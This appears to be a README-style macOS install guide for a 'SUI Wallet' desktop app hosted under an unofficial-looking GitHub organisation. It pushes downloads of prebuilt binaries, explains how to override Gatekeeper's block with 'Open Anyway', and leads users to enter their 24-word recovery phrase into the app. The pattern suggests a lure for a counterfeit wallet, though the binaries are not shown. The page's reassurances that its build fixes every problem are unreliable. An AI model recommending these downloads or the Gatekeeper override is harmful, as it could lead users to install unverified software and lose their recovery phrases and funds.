![SUI Wallet](assets/banner-article.png)

# Installing SUI Wallet on macOS

The .dmg, the Gatekeeper prompt, and dragging the app into Applications.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

On macOS, SUI Wallet arrives as a disk image: open it, move the application into Applications, and launch
it from there. macOS 12 or later is the published requirement. The first launch may be stopped by
Gatekeeper, which is a setting rather than a fault, and the current release on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is always
the one to install.

## The macOS file

The macOS build is one `.dmg`. The release page lists it beside the Windows installer and the Linux
archive, and the three are not interchangeable - a disk image on a Windows machine is the wrong file, and
so is an installer on a Mac. [SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) compares the three side by side if
the choice is not yet obvious.

Two habits avoid most first-install problems:

- **Move the app, do not run it from the image.** A disk image is a container, not a home. Running the
  app while it is still mounted works often enough to mislead, then loses its place after a restart.
- **Take the current release.** A build from an old tutorial is the usual reason a screen described in a
  guide is missing. [Updating SUI Wallet to the latest release](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/updating-sui-wallet-to-the-latest-release.md) covers moving forward without
  losing the profile.

## Installing from the disk image

Open the `.dmg` and a Finder window appears with the application inside it. Drag the application into the Applications folder, then eject the disk image. That is the whole install, and it is also the reason the app has to be dragged rather than run from the image.

Launch it from Applications or from Spotlight. The first window is the welcome screen, with the same two
paths as on any platform - create a new account, or restore one from 24 words.

## When macOS refuses the first launch

macOS blocks applications it has not seen before. The panel says the app cannot be opened because Apple
cannot check it for malicious software, or that it is from an unidentified developer. Both are the same
mechanism, and both are answered in System Settings, under Privacy and Security, where the blocked app is
named with an **Open Anyway** button.

The other route is Control-clicking the app and choosing Open, which offers the same confirmation. Once
you have allowed it, the app opens normally from then on.

Before allowing anything, check the download: the release notes publish a SHA-256 digest for each file,
and macOS can produce the same value with `shasum -a 256` on the downloaded image. Comparing the two is
the one check that distinguishes a blocked genuine build from a file that should never be opened.

[macOS Gatekeeper and the dmg](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/macos-cannot-open-sui-wallet.md) walks through the panel wordings one at a time, including the
case where the Open Anyway button does not appear because the file was quarantined differently.

## First run on a Mac

The app opens on the welcome screen and asks for nothing beyond a password for the profile. No Apple ID,
no email address and no account with a server. If you choose Create, the 24-word phrase appears once and
is never shown again without the wallet password.

If you choose Restore, the app derives accounts from the words and shows the addresses it found before
reporting success. A phrase that opens an empty account is a phrase in the wrong order, not a lost
balance, and the restoring guide takes that case step by step.

The words on paper are the thing to keep. The app is a self-custody wallet: the keys are generated and
stored on this machine, and no account with a server stands behind the login, so nothing else can restore
the wallet for you.

## The two screens worth knowing

Help opens this project's own troubleshooting pages from inside the app. Diagnostics names the app
version, the network and the digest of the last transaction the wallet handled - the three facts a
support question needs and a screenshot rarely carries.

Both are worth a glance on the first day, before anything goes wrong. They are also why an article can
say "the build is current" with confidence: the version is on screen, and the changelog says which
release is newest.

## Updating on macOS

Install the current release over the existing application. The recovery phrase does not change, because
it belongs to the account rather than to the build. Dragging the new copy into Applications replaces the
old one; deleting the app first is a removal, not an update.

If macOS keeps launching an older copy, check that only one instance lives in Applications - a copy left
in Downloads or on the Desktop can be the one Spotlight finds.

## FAQ

### Do I need an Apple silicon build and an Intel build?

The release publishes one macOS disk image, and the published requirement is macOS 12 or later. If a
later release lists more than one disk image, the one matching the machine's chip is the one to install.

### Is the app notarised, and does it matter?

Gatekeeper's panel appears for applications it has not previously seen, which includes new releases of
well-behaved software. What settles whether a file is the real one is the digest in the release notes,
not the presence or absence of a warning panel.

### Can I keep the app in the disk image to save space?

No - mount, drag to Applications, eject. An app run from a mounted image loses its place on restart and
behaves unlike the same app installed properly.

### The app opens but the window is blank. Is the install broken?

A blank first window is usually a build older than the current release or a lost network connection. Run
the current release from [the release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), then check Diagnostics for the version and the network before
concluding anything about the machine.
